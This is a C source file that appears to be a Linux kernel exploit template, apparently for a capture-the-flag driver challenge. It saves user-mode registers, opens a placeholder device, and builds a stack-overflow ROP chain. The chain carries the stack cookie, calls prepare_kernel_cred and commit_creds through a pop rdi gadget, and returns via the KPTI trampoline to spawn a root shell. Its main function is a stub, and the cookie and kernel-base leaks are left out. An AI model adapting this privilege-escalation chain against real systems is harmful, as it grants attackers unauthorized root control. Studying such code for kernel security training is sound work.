#include <fcntl.h>
#include <stdarg.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__);
#define fatal(msg, ...)                                                        \
    {                                                                          \
        printf("[!] " msg "\n", ##__VA_ARGS__);                                \
        exit(EXIT_FAILURE);                                                    \
    }

#define DEVICE_NAME "CHANGEME"
#define IOCTL_DEBUG 0x10
#define IOCTL_SET_MAX_BUFFER 0x20
#define RAW_KBASE 0xffffffff81000000

#define prepare_kernel_cred (kbase + 0x0881c0)
#define commit_creds (kbase + 0x087e80)
#define kpti_trampoline (kbase + 0xc00a2f)
#define pop_rdi (0xffffffff81001518 + offset)

int global_fd;

size_t user_cs, user_rflags, user_sp, user_ss;
size_t cookie, kbase, offset;
size_t tmp_buf, cred_struct;

enum current_state {
    create_cred_struct_state,
    spawn_shell_state,
} global_cstate;

void _write(void *buf, size_t sz) {
    ssize_t nb = write(global_fd, buf, sz);
    if (nb < 0) {
        fatal("write failure");
    }
    info("Wrote 0x%zx bytes", nb);
}

void _read(void *buf, size_t sz) {
    ssize_t nb = read(global_fd, buf, sz);
    if (nb < 0) {
        fatal("read failure");
    }
    info("Read 0x%zx bytes", nb);
}

void _ioctl(size_t cmd, size_t arg) {
    ioctl(global_fd, cmd, arg);
}

void open_dev(void) {
    global_fd = open(DEVICE_NAME, O_RDWR);
    if (global_fd < 0) {
        fatal("Failed to open device: %s", DEVICE_NAME);
    }
    info("Device opened");
}

void spawn_shell(void) {
    uid_t uid = geteuid();
    if (uid > 0) {
        fatal("Failed to get root uid, current uid = %d", uid);
    }
    info("Spawning shell as root uid");
    system("/bin/sh");
}

void privesc(void);

void safe_exit(void) {
    __asm__(".intel_syntax noprefix;"
            "mov tmp_buf, rax;"
            ".att_syntax noprefix;");
    if (global_cstate == create_cred_struct_state) {
        cred_struct = tmp_buf;
        info("cred_struct @ 0x%zx", cred_struct);
        global_cstate = spawn_shell_state;
        privesc();
        return;
    }
    spawn_shell();
}

void privesc(void) {
    size_t payload[0x200 / 8];
    size_t cookie_idx = 0x80 / 8;

    payload[cookie_idx++] = cookie;
    payload[cookie_idx++] = 0; // rbx

    if (global_cstate == create_cred_struct_state) {
        payload[cookie_idx++] = pop_rdi; // saved rip
        payload[cookie_idx++] = 0;
        payload[cookie_idx++] = prepare_kernel_cred;
    } else if (global_cstate == spawn_shell_state) {
        payload[cookie_idx++] = pop_rdi; // saved_rip
        payload[cookie_idx++] = cred_struct;
        payload[cookie_idx++] = commit_creds;
    }
    payload[cookie_idx++] = kpti_trampoline + 22;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = (size_t)safe_exit;
    payload[cookie_idx++] = user_cs;
    payload[cookie_idx++] = user_rflags;
    payload[cookie_idx++] = user_sp;
    payload[cookie_idx++] = user_ss;

    info("Sending payload");
    _write(payload, sizeof(payload));
}

void save_user_state(void) {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_sp, rsp;"
            "mov user_ss, ss;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
    info("User state saved");
}

int main(void) {
    save_user_state();

    open_dev();
    getchar();

    close(global_fd);
    return 0;
}
